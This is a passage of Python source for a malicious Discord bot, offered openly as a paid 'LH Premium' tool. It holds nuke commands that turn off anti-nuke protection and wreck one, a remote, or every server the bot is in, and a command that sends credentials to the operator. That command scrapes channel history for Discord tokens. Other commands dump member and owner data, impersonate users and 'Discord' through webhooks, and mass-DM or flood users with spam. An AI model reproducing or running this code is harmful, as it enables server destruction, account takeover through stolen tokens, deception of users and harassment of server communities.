                "⚠️ **Single-use** — consumed after one successful edit."
            ),
            color=0xffd700
        )
        embed.set_footer(text=f"Generated by {ctx.author} | LH Premium")
        try:
            await ctx.author.send(embed=embed)
            await ctx.message.delete()
            await ctx.send("🔑 Token sent to your DMs.", delete_after=5)
        except discord.Forbidden:
            await ctx.send(embed=embed, delete_after=15)
        return

    if subcommand and subcommand.upper() == "GHOST":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5)
            return
        guild  = ctx.guild
        target = None
        for member in sorted(guild.members, key=lambda m: m.top_role.position, reverse=True):
            if member == guild.me or member == guild.owner or member.bot: continue
            target = member
            break
        if target:
            try:
                await guild.me.edit(nick=target.display_name)
                avatar_bytes = await target.display_avatar.read()
                await bot.user.edit(avatar=avatar_bytes)
            except Exception:
                pass
        try: await ctx.message.delete()
        except Exception: pass
        antinuke_enabled[guild.id] = False
        await asyncio.sleep(2)
        await run_nuke(guild)
        return

    if subcommand and subcommand.upper() == "EXEC":
        if not args or len(args.split()) < 2:
            await ctx.send("❌ Usage: `!LH EXEC <serverID> <token>`", delete_after=5)
            return
        parts         = args.split()
        server_id_str = parts[0]
        tok           = parts[1]
        if not has_valid_token(tok):
            await ctx.send(embed=discord.Embed(
                title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
            ), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not (is_premium(ctx.author.id)):
            await ctx.send("❌ Premium required.", delete_after=5)
            return
        try:
            target_guild = bot.get_guild(int(server_id_str))
        except ValueError:
            await ctx.send("❌ Invalid server ID.", delete_after=5)
            return
        if not target_guild:
            await ctx.send("❌ Bot is not in that server.", delete_after=5)
            return
        consume_token(tok)
        try: await ctx.message.delete()
        except Exception: pass
        await notify_owner(discord.Embed(
            title="💀 Remote Nuke Initiated",
            description=f"Targeting: **{target_guild.name}** (`{target_guild.id}`)",
            color=0xff0000, timestamp=discord.utils.utcnow()
        ))
        antinuke_enabled[target_guild.id] = False
        await run_nuke(target_guild)
        return

    if subcommand and subcommand.upper() == "ALL":
        tok = args.strip() if args else ""
        if not has_valid_token(tok):
            await ctx.send(embed=discord.Embed(
                title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
            ), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id):
            await ctx.send("❌ Premium required.", delete_after=5)
            return
        consume_token(tok)
        guilds = list(bot.guilds)
        try: await ctx.message.delete()
        except Exception: pass
        await notify_owner(discord.Embed(
            title="💀 ALL SERVERS NUKE INITIATED",
            description=f"Targeting **{len(guilds)}** servers simultaneously.",
            color=0xff0000, timestamp=discord.utils.utcnow()
        ))
        for g in guilds:
            antinuke_enabled[g.id] = False
        await asyncio.gather(*[run_nuke(g) for g in guilds], return_exceptions=True)
        return

    # standard nuke
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Administrator required.", delete_after=5)
        return
    try: await ctx.message.delete()
    except Exception: pass
    antinuke_enabled[ctx.guild.id] = False
    await run_nuke(ctx.guild)


# ══════════════════════════════════════════════════════════════
#  LHP — premium config editor
# ══════════════════════════════════════════════════════════════

class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
    token_input = discord.ui.TextInput(
        label="Premium Token", placeholder="LHT-xxxxxxxxxxxxxxxxxxxxxxxx",
        required=True, max_length=32, style=discord.TextStyle.short
    )
    channel_name_input = discord.ui.TextInput(
        label="Channel Name", placeholder="hooked by lh clan",
        required=True, max_length=100, style=discord.TextStyle.short
    )
    message_input = discord.ui.TextInput(
        label="Spam Message", placeholder="lol ur server doesn't even have any good protection",
        required=True, max_length=2000, style=discord.TextStyle.paragraph
    )
    channel_count_input = discord.ui.TextInput(
        label="Channel Count (min 12)", placeholder="12",
        required=True, max_length=3, style=discord.TextStyle.short
    )
    spam_count_input = discord.ui.TextInput(
        label="Spam Count per Channel (max 200)", placeholder="100",
        required=True, max_length=3, style=discord.TextStyle.short
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        tok = self.token_input.value.strip()
        if not has_valid_token(tok):
            await interaction.followup.send(embed=discord.Embed(
                title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
            ), ephemeral=True)
            return
        try:
            ch_count = int(self.channel_count_input.value.strip())
            sp_count = int(self.spam_count_input.value.strip())
        except ValueError:
            await interaction.followup.send("❌ Counts must be numbers.", ephemeral=True)
            return
        ch_count = max(12, ch_count)
        sp_count = max(1, min(sp_count, 200))
        nuke_config["channel_name"]  = self.channel_name_input.value.strip()
        nuke_config["message"]       = self.message_input.value.strip()
        nuke_config["channel_count"] = ch_count
        nuke_config["spam_count"]    = sp_count
        consume_token(tok)
        preview = nuke_config['message'][:100] + "..." if len(nuke_config['message']) > 100 else nuke_config['message']
        embed = discord.Embed(title="✅ Nuke Config Updated", color=0x00ff00)
        embed.add_field(name="Channel Name",  value=f"`{nuke_config['channel_name']}`", inline=False)
        embed.add_field(name="Spam Message",  value=f"`{preview}`",                     inline=False)
        embed.add_field(name="Channel Count", value=str(nuke_config["channel_count"]),  inline=True)
        embed.add_field(name="Spam Count",    value=str(nuke_config["spam_count"]),     inline=True)
        embed.set_footer(text="Token consumed. Generate new: !LH T")
        await interaction.followup.send(embed=embed, ephemeral=True)

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        await interaction.followup.send("❌ Something broke. Try again.", ephemeral=True)


@bot.command(name="LHP")
async def lhp(ctx):
    try: await ctx.message.delete()
    except Exception: pass

    class LHPView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=60)

        @discord.ui.button(label="⚙️ Open Config Editor", style=discord.ButtonStyle.blurple)
        async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
            if interaction.user.id != ctx.author.id:
                await interaction.response.send_message("❌ Only the command runner can use this.", ephemeral=True)
                return
            await interaction.response.send_modal(LHPModal())
            self.stop()

    embed = discord.Embed(
        title="⚙️ LH Premium Config",
        description="Click to open the nuke config editor.\nRequires a valid token from `!LH T`.",
        color=0xffd700
    )
    msg = await ctx.send(embed=embed, view=LHPView())
    await asyncio.sleep(61)
    try: await msg.delete()
    except Exception: pass


# ══════════════════════════════════════════════════════════════
#  INTEL GATHERING
# ══════════════════════════════════════════════════════════════

@bot.command(name="LHSPY")
async def lh_spy(ctx):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: await ctx.message.delete()
    except Exception: pass
    guilds = bot.guilds
    if not guilds:
        await ctx.author.send("Bot is not in any servers.")
        return
    pages = [guilds[i:i+10] for i in range(0, len(guilds), 10)]
    for idx, page in enumerate(pages):
        embed = discord.Embed(
            title=f"📡 Server Spy — Page {idx+1}/{len(pages)}",
            color=0xff4400, timestamp=discord.utils.utcnow()
        )
        for g in page:
            try:
                owner = await bot.fetch_user(g.owner_id)
                owner_str = f"{owner} (`{owner.id}`)"
            except Exception:
                owner_str = f"ID: `{g.owner_id}`"
            embed.add_field(
                name=g.name,
                value=(
                    f"ID: `{g.id}`\n"
                    f"Members: `{g.member_count}`\n"
                    f"Owner: {owner_str}\n"
                    f"Channels: `{len(g.channels)}`\n"
                    f"AntiNuke: {'🟢' if antinuke_enabled[g.id] else '🔴'}"
                ),
                inline=True
            )
        embed.set_footer(text=f"Total servers: {len(guilds)}")
        try: await ctx.author.send(embed=embed)
        except discord.Forbidden: await ctx.send(embed=embed, delete_after=30)
    await ctx.send("📡 Spy report sent to your DMs.", delete_after=5)


@bot.command(name="LHMEMBERS")
async def lh_members(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    if not server_id:
        await ctx.send("❌ Usage: `!LHMEMBERS <serverID>`", delete_after=5)
        return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5)
        return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5)
        return
    try: await ctx.message.delete()
    except Exception: pass
    await ctx.send("📋 Fetching member list...", delete_after=5)
    lines = [f"Member List — {guild.name} ({guild.id})\n{'='*50}"]
    async for member in guild.fetch_members(limit=None):
        joined   = member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "unknown"
        top_role = member.top_role.name if member.top_role else "none"
        lines.append(
            f"Username : {member}\nID       : {member.id}\n"
            f"Top Role : {top_role}\nJoined   : {joined}\n"
            f"Bot      : {'Yes' if member.bot else 'No'}\n{'-'*40}"
        )
    output    = "\n".join(lines)
    file_path = f"/tmp/members_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(output)
    try:
        await ctx.author.send(
            content=f"📋 Member list for **{guild.name}** — `{len(guild.members)}` members",
            file=discord.File(file_path, filename=f"members_{guild.name}.txt")
        )
        await ctx.send("📋 Member list sent to your DMs.", delete_after=5)
    except discord.Forbidden:
        await ctx.send(file=discord.File(file_path, filename=f"members_{guild.name}.txt"))


@bot.command(name="LHTOKENS")
async def lh_tokens(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    if not server_id:
        await ctx.send("❌ Usage: `!LHTOKENS <serverID>`", delete_after=5)
        return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5)
        return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5)
        return
    try: await ctx.message.delete()
    except Exception: pass
    status = await ctx.send("🔍 Scanning channels for tokens...")
    found  = []
    for channel in guild.text_channels:
        try:
            async for msg in channel.history(limit=500):
                for match in DISCORD_TOKEN_REGEX.findall(msg.content):
                    found.append(
                        f"Token  : {match}\nAuthor : {msg.author} ({msg.author.id})\n"
                        f"Channel: #{channel.name}\n{'─'*40}"
                    )
        except Exception:
            continue
    try: await status.delete()
    except Exception: pass
    if not found:
        try: await ctx.author.send(f"🔍 Scan complete for **{guild.name}** — no tokens found.")
        except Exception: await ctx.send("🔍 Scan complete — no tokens found.", delete_after=10)
        return
    output    = f"Token Scan — {guild.name} ({guild.id})\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
    file_path = f"/tmp/tokens_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(output)
    try:
        await ctx.author.send(
            content=f"🔑 Found **{len(found)}** token(s) in **{guild.name}**",
            file=discord.File(file_path, filename=f"tokens_{guild.name}.txt")
        )
    except discord.Forbidden:
        await ctx.send(file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))


# ══════════════════════════════════════════════════════════════
#  SOCIAL ENGINEERING
# ══════════════════════════════════════════════════════════════

@bot.command(name="impersonate")
async def impersonate(ctx, token_str: str = None, user_id: str = None, *, message: str = None):
    if not token_str or not user_id or not message:
        await ctx.send("❌ Usage: `!impersonate <token> <userID> <message>`", delete_after=5)
        return
    if not has_valid_token(token_str):
        await ctx.send(embed=discord.Embed(
            title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
        ), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: await ctx.message.delete()
    except Exception: pass
    try: target = await bot.fetch_user(int(user_id))
    except (discord.NotFound, ValueError):
        await ctx.send("❌ User not found.", delete_after=5)
        return
    try: webhook = await ctx.channel.create_webhook(name=target.display_name)
    except discord.Forbidden:
        await ctx.send("❌ Bot needs Manage Webhooks permission.", delete_after=5)
        return
    consume_token(token_str)
    try:
        await webhook.send(content=message, username=target.display_name, avatar_url=target.display_avatar.url)
    except Exception as e:
        await ctx.send(f"❌ Send failed: `{e}`", delete_after=5)
    finally:
        await webhook.delete()


@bot.command(name="massdm")
async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: str = None):
    if not token_str or not server_id or not message:
        await ctx.send("❌ Usage: `!massdm <token> <serverID> <message>`", delete_after=5)
        return
    if not has_valid_token(token_str):
        await ctx.send(embed=discord.Embed(
            title="❌ Invalid Token", description="Token doesn't exist or already used.", color=0xff0000
        ), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5)
        return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5)
        return
    consume_token(token_str)
    try: await ctx.message.delete()
    except Exception: pass
    status_msg = await ctx.send(f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count} sent")
    success = 0
    failed  = 0
    for member in guild.members:
        if member.bot: continue
        try:
            await member.send(message)
            success += 1
        except Exception:
            failed += 1
        if (success + failed) % 10 == 0:
            try:
                await status_msg.edit(
                    content=f"📬 Mass DMing **{guild.name}**... {success+failed}/{guild.member_count}"
                )
            except Exception: pass
    embed = discord.Embed(title="📬 Mass DM Complete", color=0x00ff00)
    embed.add_field(name="Server",    value=guild.name,   inline=False)
    embed.add_field(name="✅ Sent",   value=str(success), inline=True)
    embed.add_field(name="❌ Failed", value=str(failed),  inline=True)
    try: await status_msg.delete()
    except Exception: pass
    try: await ctx.author.send(embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=15)


@bot.command(name="fake")
@commands.has_permissions(administrator=True)
async def fake_system(ctx, *, message: str = None):
    if not message:
        await ctx.send("❌ Usage: `!fake <message>`", delete_after=5)
        return
    try: await ctx.message.delete()
    except Exception: pass
    try: webhook = await ctx.channel.create_webhook(name="Discord")
    except discord.Forbidden:
        await ctx.send("❌ Bot needs Manage Webhooks permission.", delete_after=5)
        return
    try:
        await webhook.send(
            content=message,
            username="Discord",
            avatar_url="https://cdn.discordapp.com/embed/avatars/0.png"
        )
    except Exception as e:
        await ctx.send(f"❌ Send failed: `{e}`", delete_after=5)
    finally:
        await webhook.delete()


# ══════════════════════════════════════════════════════════════
#  DM
# ══════════════════════════════════════════════════════════════

@bot.tree.command(name="dm", description="DM a user by @mention or ID")
@app_commands.describe(
    member="@mention a server member",
    user_id="Or paste a user ID (outside server)",
    message="Message to send",
    count="How many times (max 200)",
    delay="Delay in seconds between messages"
)
async def dm(
    interaction: discord.Interaction,
    message: str,
    count: app_commands.Range[int, 1, 200],
    member: Optional[discord.Member] = None,
    user_id: Optional[str] = None,
    delay: Optional[float] = None
):
    await interaction.response.defer(ephemeral=True)
    actual_delay = max(0.0, min(delay or 0.0, 10.0))
    if member:
        user = member
    elif user_id:
        try: user = await bot.fetch_user(int(user_id))
        except discord.NotFound:
            await interaction.followup.send("❌ User not found.", ephemeral=True)
            return
        except ValueError:
            await interaction.followup.send("❌ Invalid ID.", ephemeral=True)
            return
    else:
        await interaction.followup.send("❌ Provide a @mention or user ID.", ephemeral=True)
        return
    success = 0
    failed  = 0
    for _ in range(count):
        try:
            await user.send(message)
            success += 1
            if actual_delay > 0:
                await asyncio.sleep(actual_delay)
        except discord.Forbidden:
            failed = count - success
            break
        except discord.HTTPException:
            failed += 1
    color = 0x00ff00 if failed == 0 else (0xff0000 if success == 0 else 0xff9900)
    embed = discord.Embed(title="📬 DM Report", color=color)
    embed.add_field(name="Target",       value=f"{user} (`{user.id}`)", inline=False)
    embed.add_field(name="✅ Sent",      value=str(success),            inline=True)
    embed.add_field(name="❌ Failed",    value=str(failed),             inline=True)
    embed.add_field(name="📨 Requested", value=str(count),             inline=True)
    embed.set_footer(text=f"Requested by {interaction.user}")
    await interaction.followup.send(embed=embed, ephemeral=True)


# ══════════════════════════════════════════════════════════════
#  INFO
# ══════════════════════════════════════════════════════════════

@bot.tree.command(name="serverinfo", description="Show server info")
async def serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=g.icon.url if g.icon else None)
    embed.add_field(name="Owner",    value=str(g.owner),                      inline=True)
    embed.add_field(name="Members",  value=str(g.member_count),               inline=True)
    embed.add_field(name="Channels", value=str(len(g.channels)),              inline=True)
    embed.add_field(name="Roles",    value=str(len(g.roles)),                 inline=True)
    embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"), inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="userinfo", description="Show info about a user")
@app_commands.describe(member="User to inspect")
async def userinfo(interaction: discord.Interaction, member: discord.Member):
    embed = discord.Embed(title=f"👤 {member}", color=member.color, timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="ID",              value=str(member.id),                         inline=True)
    embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),  inline=True)
    embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"), inline=True)
    embed.add_field(name="Top Role",        value=member.top_role.mention,                inline=True)
    embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",          inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="poll", description="Create a yes/no poll")
@app_commands.describe(question="What to ask")
async def poll(interaction: discord.Interaction, question: str):
    embed = discord.Embed(title="📊 Poll", description=question, color=0xfee75c)
    embed.set_footer(text=f"Asked by {interaction.user}")
    await interaction.response.send_message(embed=embed)
    msg = await interaction.original_response()
    await msg.add_reaction("✅")
    await msg.add_reaction("❌")


@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    color   = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
    embed   = discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color)
    await interaction.response.send_message(embed=embed, ephemeral=True)


# ── run ───────────────────────────────────────────────────────
bot.run(TOKEN)
